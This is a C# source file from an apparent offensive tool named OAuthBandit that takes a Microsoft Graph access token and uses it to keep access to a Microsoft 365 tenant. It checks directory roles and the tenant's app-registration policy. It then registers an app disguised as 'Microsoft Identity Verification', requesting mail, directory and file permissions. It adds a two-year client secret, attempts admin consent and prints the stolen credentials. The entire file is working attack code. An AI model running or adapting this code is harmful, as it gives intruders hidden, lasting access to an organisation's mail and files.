using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using OAuthBandit.Core;
using OAuthBandit.Crypto;

namespace OAuthBandit.Mfa;

public class AppRegisterService
{
    private const string GraphBase = "https://graph.microsoft.com/v1.0";
    private const string GraphBeta = "https://graph.microsoft.com/beta";
    private readonly GraphClient _graph;
    private readonly string _accessToken;

    public AppRegisterService(string accessToken)
    {
        _accessToken = accessToken;
        _graph = new GraphClient(accessToken);
    }

    public Dictionary<string, object?> CheckCanRegister()
    {
        var check = new Dictionary<string, object?>
        {
            ["can_register"] = false,
            ["tenant_allows_user_apps"] = null,
            ["user_is_admin"] = false,
            ["user_roles"] = new List<string>(),
            ["reason"] = ""
        };

        // 1. Check user directory roles
        Console.WriteLine("    [*] Checking user directory roles...");
        try
        {
            var (rolesData, status, errCode, _) = _graph.GetDetailed(
                $"{GraphBase}/me/memberOf/microsoft.graph.directoryRole");

            if (rolesData != null && rolesData.Value.TryGetProperty("value", out var roles))
            {
                var roleNames = new List<string>();
                foreach (var role in roles.EnumerateArray())
                {
                    if (role.TryGetProperty("displayName", out var dn))
                        roleNames.Add(dn.GetString() ?? "");
                }
                check["user_roles"] = roleNames;

                var adminRoles = new HashSet<string> { "Global Administrator", "Application Administrator", "Cloud Application Administrator" };
                if (roleNames.Any(r => adminRoles.Contains(r)))
                {
                    check["user_is_admin"] = true;
                    Console.WriteLine($"    [+] User has admin role: [{string.Join(", ", roleNames)}]");
                }
                else
                {
                    Console.WriteLine($"    [*] User roles: [{string.Join(", ", roleNames)}] (no app admin)");
                }
            }
            else
            {
                if (status == 403)
                    Console.WriteLine("    [*] Cannot read directory roles (scope missing)");
                else
                    Console.WriteLine("    [*] No directory roles found for user");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"    [!] Role check error: {ex.Message}");
        }

        // 2. Check tenant policy
        Console.WriteLine("    [*] Checking tenant app registration policy...");
        try
        {
            var (result, status, _, _) = _graph.GetDetailed($"{GraphBeta}/policies/authorizationPolicy");
            if (result != null)
            {
                if (result.Value.TryGetProperty("defaultUserRolePermissions", out var perms) &&
                    perms.TryGetProperty("allowedToCreateApps", out var allowed))
                {
                    var val = allowed.GetBoolean();
                    check["tenant_allows_user_apps"] = val;
                    Console.WriteLine($"    [*] Tenant policy allowedToCreateApps: {val}");
                }
            }
            else if (status == 403)
            {
                Console.WriteLine("    [*] Cannot read tenant policy (trying anyway)");
                check["tenant_allows_user_apps"] = null;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"    [!] Policy check error: {ex.Message}");
        }

        // 3. Decision
        if ((bool)check["user_is_admin"]!)
        {
            check["can_register"] = true;
            check["reason"] = "User has admin role";
        }
        else if (check["tenant_allows_user_apps"] is true)
        {
            check["can_register"] = true;
            check["reason"] = "Tenant allows all users to register apps";
        }
        else if (check["tenant_allows_user_apps"] is false)
        {
            check["can_register"] = false;
            check["reason"] = "Tenant policy blocks user app registration and user has no admin role";
        }
        else
        {
            check["can_register"] = true;
            check["reason"] = "Could not verify policy, attempting registration";
        }

        var canReg = (bool)check["can_register"]!;
        var icon = canReg ? "+" : "!";
        var status2 = canReg ? "YES" : "NO";
        Console.WriteLine($"    [{icon}] Can register apps: {status2} ({check["reason"]})");

        return check;
    }

    public AppRegistration? RegisterApp(string? displayName = null, List<string>? permissions = null)
    {
        displayName ??= $"Microsoft Identity Verification {RandomNumberGenerator.GetHexString(6)}";
        permissions ??= new List<string> { "Mail.Read", "User.Read.All", "Files.ReadWrite.All" };

        Console.WriteLine($"    [*] Registering application: {displayName}");

        // Step 1: Create the application
        var appData = CreateApplication(displayName, permissions);
        if (appData == null) return null;

        var appObjectId = appData.Value.TryGetProperty("id", out var oid) ? oid.GetString()! : "";
        var clientId = appData.Value.TryGetProperty("appId", out var aid) ? aid.GetString()! : "";
        Console.WriteLine($"    [+] Application created: {clientId}");

        // Step 2: Add client secret
        var (secretValue, secretExpiry) = AddClientSecret(appObjectId);
        if (secretValue == null)
        {
            Console.WriteLine("    [!] Failed to create client secret");
            return null;
        }
        Console.WriteLine($"    [+] Client secret created (expires: {secretExpiry})");

        // Step 3: Get tenant ID
        var tenantId = GetTenantId();

        // Step 4: Try admin consent
        var spId = CreateServicePrincipal(clientId);
        if (spId != null) GrantAdminConsent(spId, permissions);

        var now = DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss") + " UTC";

        var registration = new AppRegistration
        {
            AppId = appObjectId,
            ClientId = clientId,
            ClientSecret = secretValue,
            TenantId = tenantId,
            DisplayName = displayName,
            ObjectId = appObjectId,
            Permissions = permissions,
            CreatedAt = now,
            SecretExpiresAt = secretExpiry ?? ""
        };

        Console.WriteLine($"    [+] App registration complete!");
        Console.WriteLine($"    [+] Client ID: {clientId}");
        Console.WriteLine($"    [+] Client Secret: {secretValue}");
        Console.WriteLine($"    [+] Tenant: {tenantId}");

        return registration;
    }

    private JsonElement? CreateApplication(string displayName, List<string> permissions)
    {
        var resourceAccess = new List<object>();
        foreach (var perm in permissions)
        {
            if (Constants.GraphPermissionIds.TryGetValue(perm, out var permId))
                resourceAccess.Add(new { id = permId, type = "Role" });
        }

        var payload = new Dictionary<string, object>
        {
            ["displayName"] = displayName,
            ["signInAudience"] = "AzureADMyOrg"
        };

        if (resourceAccess.Count > 0)
        {
            payload["requiredResourceAccess"] = new[]
            {
                new { resourceAppId = Constants.GraphAppId, resourceAccess }
            };
        }

        var (result, _, errCode, errMsg) = _graph.Post($"{GraphBase}/applications", payload);
        if (result != null) return result;

        if (errCode?.Contains("Authorization_RequestDenied") == true)
            Console.WriteLine("    [!] User is not allowed to register applications");
        else if (errCode?.Contains("Directory_QuotaExceeded") == true)
            Console.WriteLine("    [!] App registration quota exceeded");
        else if (!string.IsNullOrEmpty(errMsg))
            Console.WriteLine($"    [!] App creation failed: {errMsg[..Math.Min(errMsg.Length, 150)]}");

        return null;
    }

    private (string? secretValue, string? expiry) AddClientSecret(string appObjectId)
    {
        var endDate = DateTime.UtcNow.AddDays(730).ToString("yyyy-MM-ddTHH:mm:ssZ");

        var payload = new
        {
            passwordCredential = new
            {
                displayName = "Default",
                endDateTime = endDate
            }
        };

        try
        {
            var (result, _, _, _) = _graph.Post($"{GraphBase}/applications/{appObjectId}/addPassword", payload);
            if (result != null)
            {
                var secret = result.Value.TryGetProperty("secretText", out var s) ? s.GetString() : null;
                var expiry = result.Value.TryGetProperty("endDateTime", out var e) ? e.GetString() : endDate;
                return (secret, expiry);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"    [!] Secret creation error: {ex.Message}");
        }
        return (null, null);
    }

    private string? CreateServicePrincipal(string clientId)
    {
        try
        {
            var (result, status, _, _) = _graph.Post($"{GraphBase}/servicePrincipals", new { appId = clientId });
            if (result != null)
            {
                var spId = result.Value.TryGetProperty("id", out var id) ? id.GetString() : null;
                if (spId != null) Console.WriteLine($"    [+] Service principal created: {spId}");
                return spId;
            }

            if (status == 409)
            {
                var search = _graph.Get($"{GraphBase}/servicePrincipals?$filter=appId eq '{clientId}'");
                if (search != null && search.Value.TryGetProperty("value", out var vals))
                {
                    foreach (var v in vals.EnumerateArray())
                        if (v.TryGetProperty("id", out var vid)) return vid.GetString();
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"    [!] SP creation error: {ex.Message}");
        }
        return null;
    }

    private void GrantAdminConsent(string spId, List<string> permissions)
    {
        try
        {
            var search = _graph.Get($"{GraphBase}/servicePrincipals?$filter=appId eq '{Constants.GraphAppId}'");
            if (search == null || !search.Value.TryGetProperty("value", out var vals)) return;

            string? graphSpId = null;
            foreach (var v in vals.EnumerateArray())
            {
                if (v.TryGetProperty("id", out var vid)) { graphSpId = vid.GetString(); break; }
            }
            if (graphSpId == null) return;

            foreach (var perm in permissions)
            {
                if (!Constants.GraphPermissionIds.TryGetValue(perm, out var permId)) continue;

                var payload = new { principalId = spId, resourceId = graphSpId, appRoleId = permId };
                var (_, status, _, _) = _graph.Post($"{GraphBase}/servicePrincipals/{graphSpId}/appRoleAssignments", payload);

                if (status >= 200 && status < 300)
                    Console.WriteLine($"    [+] Admin consent granted: {perm}");
                else
                    Console.WriteLine($"    [!] Admin consent failed for {perm} (needs Global Admin)");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"    [!] Admin consent error: {ex.Message}");
        }
    }

    private string GetTenantId()
    {
        try
        {
            var result = _graph.Get($"{GraphBase}/organization");
            if (result != null && result.Value.TryGetProperty("value", out var vals))
            {
                foreach (var v in vals.EnumerateArray())
                    if (v.TryGetProperty("id", out var tid)) return tid.GetString() ?? "unknown";
            }
        }
        catch { }

        // Fallback: extract from token
        try
        {
            var parts = _accessToken.Split('.');
            if (parts.Length >= 2)
            {
                var payload = CryptoUtils.DecodeBase64Url(parts[1]);
                var json = JsonDocument.Parse(Encoding.UTF8.GetString(payload));
                if (json.RootElement.TryGetProperty("tid", out var tid))
                    return tid.GetString() ?? "unknown";
            }
        }
        catch { }

        return "unknown";
    }
}
